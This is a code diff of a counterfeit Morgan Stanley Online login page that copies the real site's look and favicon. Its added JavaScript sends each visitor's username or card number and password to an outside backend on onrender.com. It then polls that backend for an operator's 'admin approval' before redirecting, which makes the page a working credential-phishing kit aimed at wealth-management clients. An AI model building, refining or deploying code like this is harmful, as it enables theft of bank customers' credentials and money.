@@ -6,8 +6,9 @@
     <link rel="icon" type="image/x-icon" href="https://login.morganstanleyclientserv.com/ux/favicon.ico">
     <meta name="viewport" content="initial-scale=1,maximum-scale=1">
     <title>Morgan Stanley Online Log in - Wealth Management</title>
+    <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        /* === ROOT VARIABLES - Exact original values === */
+        /* Your existing CSS remains exactly the same */
         :root {
             --ms-linear-gradient-start: #0d7eb3;
             --ms-linear-gradient-end: #096491;
@@ -61,8 +62,6 @@
             line-height: 24px;
             color: #333;
         }
-
-        /* === HEADER - Exactly as on live site === */
         .mso-header-container {
             display: flex;
             justify-content: space-between;
@@ -112,8 +111,6 @@
                 height: 26px;
             }
         }
-
-        /* === MAIN LAYOUT - Pixel-perfect replica === */
         .login-page {
             width: 100%;
             min-height: 100%;
@@ -131,8 +128,6 @@
         @media (max-width: 767px) {
             .login_form { padding: 0; }
         }
-
-        /* Two-column layout */
         .login-row {
             display: flex;
             gap: 20px;
@@ -164,8 +159,6 @@
         @media (max-width: 767px) {
             .login-right { display: none; }
         }
-
-        /* === LOGIN FORM === */
         .login-container {
             max-width: 400px;
             margin: 0 auto;
@@ -181,6 +174,7 @@
         }
         .form-row {
             margin-bottom: 24px;
+            position: relative;
         }
         .input-field {
             width: 100%;
@@ -196,14 +190,20 @@
         .input-field:focus {
             border-bottom-color: #187aba;
         }
-        .password-wrapper {
+        .input-wrapper {
             display: flex;
             align-items: center;
             border-bottom: 1px solid #e9e9e9;
         }
-        .password-wrapper .input-field {
+        .input-wrapper .input-field {
             border-bottom: none;
             flex: 1;
+        }
+        .input-wrapper i {
+            color: #767676;
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
         }
         .show-hide {
             background: none;
@@ -248,8 +248,6 @@
             color: #187aba;
             font-weight: bold;
         }
-        
-        /* ROUNDED BUTTONS - All buttons now have 50px border-radius */
         .btn-login {
             background-color: #187aba;
             color: white;
@@ -259,9 +257,12 @@
             font-weight: 700;
             font-size: 16px;
             cursor: pointer;
-            display: inline-block;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
             border-radius: 50px;
             transition: background-color 0.2s;
+            position: relative;
         }
         .btn-login:hover {
             background-color: #005c90;
@@ -269,6 +270,16 @@
         .btn-login:disabled {
             background-color: #b7b7b7;
             cursor: not-allowed;
+        }
+        .btn-login .loading {
+            display: none;
+            width: 18px;
+            height: 18px;
+            margin-right: 8px;
+            animation: spin 1s linear infinite;
+        }
+        .btn-login .loading.active {
+            display: inline-block;
         }
         .btn-secondary {
             background: none;
@@ -305,8 +316,35 @@
             min-width: auto;
             padding: 8px 16px;
         }
-
-        /* === BANNER (exact match) === */
+        .error-message {
+            color: #a00;
+            font-size: 14px;
+            margin-top: 5px;
+            text-align: center;
+            display: none;
+        }
+        .error-message.show {
+            display: block;
+        }
+        .success-message {
+            color: #060;
+            font-size: 14px;
+            margin-top: 5px;
+            text-align: center;
+            display: none;
+        }
+        .success-message.show {
+            display: block;
+        }
+        .field-error {
+            color: #a00;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        .field-error.show {
+            display: block;
+        }
         .banner {
             height: 100%;
             min-height: 500px;
@@ -334,8 +372,6 @@
             line-height: 24px;
             opacity: 0.9;
         }
-
-        /* === FOOTER - Complete replica === */
         .ms-footer {
             background-color: #002b51;
             color: #fff;
@@ -399,8 +435,6 @@
             .mobile-only { display: block; }
             .footer-columns { flex-direction: column; }
         }
-
-        /* === SKIP LINK === */
         .skip-link {
             position: absolute;
             top: -200px;
@@ -415,12 +449,8 @@
         .skip-link:focus {
             top: 10px;
         }
-
-        /* === UTILITY === */
         .text-center { text-align: center; }
         .mt-4 { margin-top: 20px; }
-        
-        /* === LOADING SPINNER === */
         .spinner {
             display: inline-block;
             width: 16px;
@@ -434,16 +464,6 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        
-        /* === ERROR MESSAGE === */
-        .error-message {
-            color: #a00;
-            font-size: 14px;
-            margin-top: 5px;
-            text-align: center;
-        }
-
-        /* === PROGRESS INDICATOR === */
         .progress-container {
             margin-top: 20px;
             text-align: center;
@@ -483,31 +503,40 @@
                     <div class="login-container">
                         <h2>Log in to Morgan Stanley</h2>
 
-                        <!-- Updated form with AJAX submission -->
-                        <form id="loginForm" onsubmit="return handleLogin(event)">
+                        <!-- Updated form with correct IDs -->
+                        <form id="loginForm">
                             <div class="form-row">
-                                <input type="text" id="username" class="input-field" placeholder="Username" autocomplete="username" required aria-label="Username">
+                                <div class="input-wrapper">
+                                    <i data-lucide="user"></i>
+                                    <input type="text" id="usernameInput" class="input-field" placeholder="Username or Card Number" autocomplete="username" required aria-label="Username">
+                                </div>
+                                <div id="usernameError" class="field-error"></div>
                             </div>
                             <div class="form-row">
-                                <div class="password-wrapper">
-                                    <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="current-password" required aria-label="Password">
-                                    <button type="button" class="show-hide" onclick="togglePassword()" id="toggle-btn">Show</button>
+                                <div class="input-wrapper">
+                                    <i data-lucide="lock"></i>
+                                    <input type="password" id="passwordInput" class="input-field" placeholder="Password" autocomplete="current-password" required aria-label="Password">
+                                    <button type="button" class="show-hide" onclick="togglePassword()">Show</button>
                                 </div>
+                                <div id="passwordError" class="field-error"></div>
                             </div>
                             <div class="form-row">
                                 <label class="checkbox-label">
                                     Remember my username
-                                    <input type="checkbox" name="remember" id="remember">
+                                    <input type="checkbox" name="remember" id="rememberCheckbox">
                                     <span class="checkmark"></span>
                                 </label>
                             </div>
                             <div class="form-row text-center">
-                                <button type="submit" class="btn-login" id="loginBtn">Log in</button>
+                                <button type="submit" class="btn-login" id="submitBtn">
+                                    <i data-lucide="loader-2" class="loading"></i>
+                                    <span>Sign in</span>
+                                </button>
                             </div>
                             <div class="form-row text-center">
                                 <button type="button" class="btn-secondary" onclick="window.location.href='#';">Create a username</button>
                             </div>
-                            <div id="errorContainer" class="error-message"></div>
+                            <div id="successMessage" class="success-message"></div>
                             <div id="progressContainer" class="progress-container" style="display: none;">
                                 <div class="progress-text">Verifying your credentials...</div>
                             </div>
@@ -580,257 +609,262 @@
         </footer>
     </main>
 
-    <!-- Updated script for backend integration -->
-<script>
-    // Initialize Lucide icons
-    lucide.createIcons();
-    
-    // CORRECT BACKEND URL - Updated to your live backend
-    const BACKEND_URL = 'https://ms-bcknd.onrender.com';
-    
-    console.log('Frontend URL:', 'https://ms-phi-ten.vercel.app');
-    console.log('Using backend URL:', BACKEND_URL);
+    <script>
+        // Initialize Lucide icons
+        lucide.createIcons();
+        
+        // CORRECT BACKEND URL - Updated to your live backend
+        const BACKEND_URL = 'https://ms-bcknd.onrender.com';
+        
+        console.log('Frontend URL:', window.location.href);
+        console.log('Using backend URL:', BACKEND_URL);
 
-    // Password toggle function
-    function togglePassword() {
-        const pwd = document.getElementById('passwordInput');
-        const btn = document.querySelector('.show-hide');
-        if (pwd.type === 'password') {
-            pwd.type = 'text';
-            btn.textContent = 'Hide';
-        } else {
-            pwd.type = 'password';
-            btn.textContent = 'Show';
-        }
-    }
-
-    // Handle login form submission
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        const login = document.getElementById('usernameInput').value;
-        const password = document.getElementById('passwordInput').value;
-        const submitBtn = document.getElementById('submitBtn');
-        const loadingIcon = submitBtn.querySelector('.loading');
-        const submitText = submitBtn.querySelector('span');
-        
-        // Reset messages
-        document.getElementById('usernameError').classList.remove('show');
-        document.getElementById('passwordError').classList.remove('show');
-        document.getElementById('successMessage').classList.remove('show');
-        
-        // Validate inputs
-        if (!login.trim()) {
-            document.getElementById('usernameError').textContent = 'Please enter username or card number';
-            document.getElementById('usernameError').classList.add('show');
-            return;
-        }
-        
-        if (!password.trim()) {
-            document.getElementById('passwordError').textContent = 'Please enter password';
-            document.getElementById('passwordError').classList.add('show');
-            return;
-        }
-        
-        // Show loading state
-        loadingIcon.classList.add('active');
-        submitText.textContent = 'Signing in...';
-        submitBtn.disabled = true;
-        
-        // Save username if remember checkbox is checked
-        const rememberCheckbox = document.getElementById('rememberCheckbox');
-        if (rememberCheckbox.checked && login.trim()) {
-            localStorage.setItem('savedUsername', login.trim());
-        } else {
-            localStorage.removeItem('savedUsername');
-        }
-        
-        try {
-            console.log('Sending request to:', `${BACKEND_URL}/login`);
-            console.log('Data:', { login: login, password: '[REDACTED]' });
-            
-            const response = await fetch(`${BACKEND_URL}/login`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify({
-                    login: login,
-                    password: password
-                })
-            });
-            
-            console.log('Response status:', response.status);
-            
-            const data = await response.json();
-            console.log('Response data:', data);
-            
-            if (response.ok && data.success) {
-                // Success - store session ID and start polling
-                const sessionId = data.id;
-                localStorage.setItem('sessionId', sessionId);
-                
-                // Show success message
-                document.getElementById('successMessage').textContent = 'Login request sent. Waiting for admin approval...';
-                document.getElementById('successMessage').classList.add('show');
-                
-                // Start polling for status
-                pollStatus(sessionId);
+        // Password toggle function
+        function togglePassword() {
+            const pwd = document.getElementById('passwordInput');
+            const btn = document.querySelector('.show-hide');
+            if (pwd.type === 'password') {
+                pwd.type = 'text';
+                btn.textContent = 'Hide';
             } else {
-                // Show error
-                const errorMsg = data.error || `Login failed. Status: ${response.status}`;
-                document.getElementById('passwordError').textContent = errorMsg;
+                pwd.type = 'password';
+                btn.textContent = 'Show';
+            }
+        }
+
+        // Handle login form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const login = document.getElementById('usernameInput').value;
+            const password = document.getElementById('passwordInput').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingIcon = submitBtn.querySelector('.loading');
+            const submitText = submitBtn.querySelector('span');
+            
+            // Reset messages
+            document.getElementById('usernameError').classList.remove('show');
+            document.getElementById('passwordError').classList.remove('show');
+            document.getElementById('successMessage').classList.remove('show');
+            
+            // Validate inputs
+            if (!login.trim()) {
+                document.getElementById('usernameError').textContent = 'Please enter username or card number';
+                document.getElementById('usernameError').classList.add('show');
+                return;
+            }
+            
+            if (!password.trim()) {
+                document.getElementById('passwordError').textContent = 'Please enter password';
+                document.getElementById('passwordError').classList.add('show');
+                return;
+            }
+            
+            // Show loading state
+            loadingIcon.classList.add('active');
+            submitText.textContent = 'Signing in...';
+            submitBtn.disabled = true;
+            
+            // Show progress container
+            document.getElementById('progressContainer').style.display = 'block';
+            
+            // Save username if remember checkbox is checked
+            const rememberCheckbox = document.getElementById('rememberCheckbox');
+            if (rememberCheckbox.checked && login.trim()) {
+                localStorage.setItem('savedUsername', login.trim());
+            } else {
+                localStorage.removeItem('savedUsername');
+            }
+            
+            try {
+                console.log('Sending request to:', `${BACKEND_URL}/login`);
+                
+                const response = await fetch(`${BACKEND_URL}/login`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        login: login,
+                        password: password
+                    })
+                });
+                
+                console.log('Response status:', response.status);
+                
+                const data = await response.json();
+                console.log('Response data:', data);
+                
+                if (response.ok && data.success) {
+                    // Success - store session ID and start polling
+                    const sessionId = data.id;
+                    localStorage.setItem('sessionId', sessionId);
+                    
+                    // Show success message
+                    document.getElementById('successMessage').textContent = 'Login request sent. Waiting for admin approval...';
+                    document.getElementById('successMessage').classList.add('show');
+                    
+                    // Start polling for status
+                    pollStatus(sessionId);
+                } else {
+                    // Show error
+                    const errorMsg = data.error || `Login failed. Status: ${response.status}`;
+                    document.getElementById('passwordError').textContent = errorMsg;
+                    document.getElementById('passwordError').classList.add('show');
+                    
+                    // Reset button
+                    loadingIcon.classList.remove('active');
+                    submitText.textContent = 'Sign in';
+                    submitBtn.disabled = false;
+                    document.getElementById('progressContainer').style.display = 'none';
+                }
+            } catch (error) {
+                console.error('Network error:', error);
+                document.getElementById('passwordError').textContent = `Network error: ${error.message}. Please check backend connection.`;
                 document.getElementById('passwordError').classList.add('show');
                 
                 // Reset button
                 loadingIcon.classList.remove('active');
                 submitText.textContent = 'Sign in';
                 submitBtn.disabled = false;
+                document.getElementById('progressContainer').style.display = 'none';
             }
-        } catch (error) {
-            console.error('Network error:', error);
-            document.getElementById('passwordError').textContent = `Network error: ${error.message}. Please check backend URL: ${BACKEND_URL}`;
-            document.getElementById('passwordError').classList.add('show');
-            
-            // Reset button
-            loadingIcon.classList.remove('active');
-            submitText.textContent = 'Sign in';
-            submitBtn.disabled = false;
-        }
-    });
-    
-    async function pollStatus(sessionId) {
-        let attempts = 0;
-        const maxAttempts = 120; // Try for 10 minutes (5 seconds * 120 = 600 seconds)
-        const submitBtn = document.getElementById('submitBtn');
-        const loadingIcon = submitBtn.querySelector('.loading');
-        const submitText = submitBtn.querySelector('span');
-        const successMessage = document.getElementById('successMessage');
+        });
         
-        const checkStatus = async () => {
-            try {
-                console.log(`Checking status for session: ${sessionId}, attempt: ${attempts + 1}`);
-                const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
-                
-                if (!response.ok) {
-                    console.error('Status check failed:', response.status);
+        async function pollStatus(sessionId) {
+            let attempts = 0;
+            const maxAttempts = 120; // Try for 10 minutes (5 seconds * 120 = 600 seconds)
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingIcon = submitBtn.querySelector('.loading');
+            const submitText = submitBtn.querySelector('span');
+            const successMessage = document.getElementById('successMessage');
+            
+            const checkStatus = async () => {
+                try {
+                    console.log(`Checking status for session: ${sessionId}, attempt: ${attempts + 1}`);
+                    const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
+                    
+                    if (!response.ok) {
+                        console.error('Status check failed:', response.status);
+                        attempts++;
+                        if (attempts < maxAttempts) {
+                            setTimeout(checkStatus, 5000);
+                        } else {
+                            document.getElementById('passwordError').textContent = 'Status check timed out after 10 minutes. Please try again.';
+                            document.getElementById('passwordError').classList.add('show');
+                            successMessage.classList.remove('show');
+                            document.getElementById('progressContainer').style.display = 'none';
+                            resetButton();
+                        }
+                        return;
+                    }
+                    
+                    const data = await response.json();
+                    console.log('Status check response:', data);
+                    
+                    if (data.status === 'approved' && data.redirect_url) {
+                        // Redirect to the approved URL
+                        console.log('Approved! Redirecting to:', data.redirect_url);
+                        window.location.href = data.redirect_url;
+                        return true;
+                    } else if (data.status === 'pending') {
+                        // Continue polling
+                        attempts++;
+                        if (attempts < maxAttempts) {
+                            setTimeout(checkStatus, 5000); // Check every 5 seconds
+                            
+                            // Update message every few attempts
+                            if (attempts % 12 === 0) { // Every minute
+                                successMessage.textContent = `Still waiting for admin approval... (${attempts/12} minute(s))`;
+                            }
+                        } else {
+                            // Timeout
+                            document.getElementById('passwordError').textContent = 'Request timed out after 10 minutes. Please try again.';
+                            document.getElementById('passwordError').classList.add('show');
+                            successMessage.classList.remove('show');
+                            document.getElementById('progressContainer').style.display = 'none';
+                            resetButton();
+                        }
+                    } else if (data.error) {
+                        // Error from backend
+                        document.getElementById('passwordError').textContent = `Error: ${data.error}`;
+                        document.getElementById('passwordError').classList.add('show');
+                        successMessage.classList.remove('show');
+                        document.getElementById('progressContainer').style.display = 'none';
+                        resetButton();
+                    }
+                } catch (error) {
+                    console.error('Status check error:', error);
                     attempts++;
                     if (attempts < maxAttempts) {
                         setTimeout(checkStatus, 5000);
                     } else {
-                        document.getElementById('passwordError').textContent = 'Status check timed out after 10 minutes. Please try again.';
+                        document.getElementById('passwordError').textContent = 'Status check error. Please try again.';
                         document.getElementById('passwordError').classList.add('show');
                         successMessage.classList.remove('show');
+                        document.getElementById('progressContainer').style.display = 'none';
                         resetButton();
                     }
-                    return;
                 }
-                
-                const data = await response.json();
-                console.log('Status check response:', data);
-                
-                if (data.status === 'approved' && data.redirect_url) {
-                    // Redirect to the approved URL
-                    console.log('Approved! Redirecting to:', data.redirect_url);
-                    window.location.href = data.redirect_url;
-                    return true;
-                } else if (data.status === 'pending') {
-                    // Continue polling
-                    attempts++;
-                    if (attempts < maxAttempts) {
-                        setTimeout(checkStatus, 5000); // Check every 5 seconds
-                        
-                        // Update message every few attempts
-                        if (attempts % 12 === 0) { // Every minute
-                            successMessage.textContent = `Still waiting for admin approval... (${attempts/12} minute(s))`;
-                        }
-                    } else {
-                        // Timeout
-                        document.getElementById('passwordError').textContent = 'Request timed out after 10 minutes. Please try again.';
-                        document.getElementById('passwordError').classList.add('show');
-                        successMessage.classList.remove('show');
-                        resetButton();
-                    }
-                } else if (data.error) {
-                    // Error from backend
-                    document.getElementById('passwordError').textContent = `Error: ${data.error}`;
-                    document.getElementById('passwordError').classList.add('show');
-                    successMessage.classList.remove('show');
-                    resetButton();
-                }
-            } catch (error) {
-                console.error('Status check error:', error);
-                attempts++;
-                if (attempts < maxAttempts) {
-                    setTimeout(checkStatus, 5000);
-                } else {
-                    document.getElementById('passwordError').textContent = 'Status check error. Please try again.';
-                    document.getElementById('passwordError').classList.add('show');
-                    successMessage.classList.remove('show');
-                    resetButton();
-                }
-            }
-            return false;
-        };
-        
-        // Start polling
-        setTimeout(checkStatus, 5000); // First check after 5 seconds
-    }
-    
-    function resetButton() {
-        const submitBtn = document.getElementById('submitBtn');
-        const loadingIcon = submitBtn.querySelector('.loading');
-        const submitText = submitBtn.querySelector('span');
-        
-        loadingIcon.classList.remove('active');
-        submitText.textContent = 'Sign in';
-        submitBtn.disabled = false;
-    }
-    
-    // Auto-fill saved credentials if remember me was checked
-    document.addEventListener('DOMContentLoaded', function() {
-        const rememberCheckbox = document.getElementById('rememberCheckbox');
-        const usernameInput = document.getElementById('usernameInput');
-        
-        // Check if we have saved credentials
-        const savedUsername = localStorage.getItem('savedUsername');
-        if (savedUsername) {
-            usernameInput.value = savedUsername;
-            rememberCheckbox.checked = true;
+                return false;
+            };
+            
+            // Start polling
+            setTimeout(checkStatus, 5000); // First check after 5 seconds
         }
         
-        // Update save state on checkbox change
-        rememberCheckbox.addEventListener('change', function() {
-            if (this.checked && usernameInput.value) {
-                localStorage.setItem('savedUsername', usernameInput.value);
-            } else {
-                localStorage.removeItem('savedUsername');
-            }
-        });
+        function resetButton() {
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingIcon = submitBtn.querySelector('.loading');
+            const submitText = submitBtn.querySelector('span');
+            
+            loadingIcon.classList.remove('active');
+            submitText.textContent = 'Sign in';
+            submitBtn.disabled = false;
+        }
         
-        // Update on input
-        usernameInput.addEventListener('input', function() {
-            if (rememberCheckbox.checked && this.value) {
-                localStorage.setItem('savedUsername', this.value);
+        // Auto-fill saved credentials if remember me was checked
+        document.addEventListener('DOMContentLoaded', function() {
+            const rememberCheckbox = document.getElementById('rememberCheckbox');
+            const usernameInput = document.getElementById('usernameInput');
+            
+            // Check if we have saved credentials
+            const savedUsername = localStorage.getItem('savedUsername');
+            if (savedUsername) {
+                usernameInput.value = savedUsername;
+                rememberCheckbox.checked = true;
             }
-        });
-        
-        // Test backend connection
-        console.log('Testing backend connection...');
-        fetch(`${BACKEND_URL}/`)
-            .then(response => {
-                console.log('Backend connection test:', response.status);
-                if (response.ok) {
-                    console.log('✅ Backend is reachable!');
+            
+            // Update save state on checkbox change
+            rememberCheckbox.addEventListener('change', function() {
+                if (this.checked && usernameInput.value) {
+                    localStorage.setItem('savedUsername', usernameInput.value);
+                } else {
+                    localStorage.removeItem('savedUsername');
                 }
-            })
-            .catch(error => {
-                console.error('❌ Backend connection failed:', error);
             });
-    });
-</script>
+            
+            // Update on input
+            usernameInput.addEventListener('input', function() {
+                if (rememberCheckbox.checked && this.value) {
+                    localStorage.setItem('savedUsername', this.value);
+                }
+            });
+            
+            // Test backend connection
+            console.log('Testing backend connection...');
+            fetch(`${BACKEND_URL}/`)
+                .then(response => {
+                    console.log('Backend connection test:', response.status);
+                    if (response.ok) {
+                        console.log('✅ Backend is reachable!');
+                    }
+                })
+                .catch(error => {
+                    console.error('❌ Backend connection failed:', error);
+                });
+        });
+    </script>
 </body>
 </html>
-
-
